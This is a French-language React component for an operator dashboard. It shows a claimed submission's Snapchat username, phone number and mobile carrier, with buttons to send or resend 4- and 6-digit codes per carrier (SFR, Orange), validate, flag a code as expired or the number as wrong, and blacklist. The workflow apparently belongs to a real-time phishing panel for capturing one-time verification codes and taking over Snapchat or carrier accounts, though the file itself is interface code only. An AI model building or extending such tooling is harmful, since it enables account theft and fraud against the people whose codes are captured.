import { motion } from "framer-motion";
import { Ghost, Send, RefreshCw, Check, X, Clock, Ban } from "lucide-react";

const operatorBadge = {
  SFR: "bg-red-500/15 text-red-400 border-red-500/30",
  Bouygues: "bg-blue-500/15 text-blue-400 border-blue-500/30",
  Orange: "bg-orange-400/15 text-orange-400 border-orange-400/30",
};

const actions = [
  { id: "code_ready", label: "Envoyer le code (4)", cls: "bg-primary text-primary-foreground hover:bg-primary/80" },
  { id: "code6", label: "Renvoyer (6 chiffres)", cls: "bg-purple-500/15 text-purple-300 border border-purple-500/40 hover:bg-purple-500/25" },
  { id: "code6sfr", label: "Renvoyer (SFR)", cls: "bg-red-500/15 text-red-300 border border-red-500/40 hover:bg-red-500/25" },
  { id: "code6orange", label: "Renvoyer (Orange)", cls: "bg-orange-500/15 text-orange-300 border border-orange-500/40 hover:bg-orange-500/25" },
  { id: "valid", label: "Valider", cls: "bg-green-500/15 text-green-300 border border-green-500/40 hover:bg-green-500/25" },
  { id: "wrong", label: "Mauvais numéro", cls: "bg-red-500/15 text-red-300 border border-red-500/40 hover:bg-red-500/25" },
  { id: "expired", label: "Code expiré", cls: "bg-yellow-500/15 text-yellow-300 border border-yellow-500/40 hover:bg-yellow-500/25" },
];

export default function ClaimedActions({ submission, onAction, onBlacklist, busyKey }) {
  const sub = submission;
  return (
    <motion.div
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-card border-2 border-primary/50 rounded-2xl p-5 shadow-xl shadow-primary/10"
    >
      <div className="flex items-center justify-between mb-3">
        <span className="text-[11px] font-bold uppercase tracking-wide text-primary">En cours — réclamée</span>
        <span className="text-[11px] text-muted-foreground font-mono">#{sub.id.slice(-6)}</span>
      </div>

      <div className="flex items-center gap-2 mb-1">
        <Ghost className="w-4 h-4 text-muted-foreground/70" />
        <span className="text-lg font-bold text-foreground">{sub.snapchat}</span>
        <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${operatorBadge[sub.operateur]}`}>{sub.operateur}</span>
      </div>
      <p className="text-sm text-muted-foreground font-mono mb-4">{sub.telephone}</p>

      <div className="grid grid-cols-2 gap-2">
        {actions.map((a) => (
          <button
            key={a.id}
            disabled={!!busyKey}
            onClick={() => onAction(a.id)}
            className={`text-xs font-bold py-2.5 rounded-lg transition-colors disabled:opacity-50 ${a.cls}`}
          >
            {busyKey === a.id ? <span className="w-3.5 h-3.5 border-2 border-current/30 border-t-current rounded-full animate-spin inline-block" /> : a.label}
          </button>
        ))}
        <button
          disabled={!!busyKey}
          onClick={onBlacklist}
          className="col-span-2 bg-destructive/15 text-destructive border border-destructive/40 hover:bg-destructive/25 text-xs font-bold py-2.5 rounded-lg transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
        >
          <Ban className="w-3.5 h-3.5" /> Blacklist instantanée
        </button>
      </div>
    </motion.div>
  );
}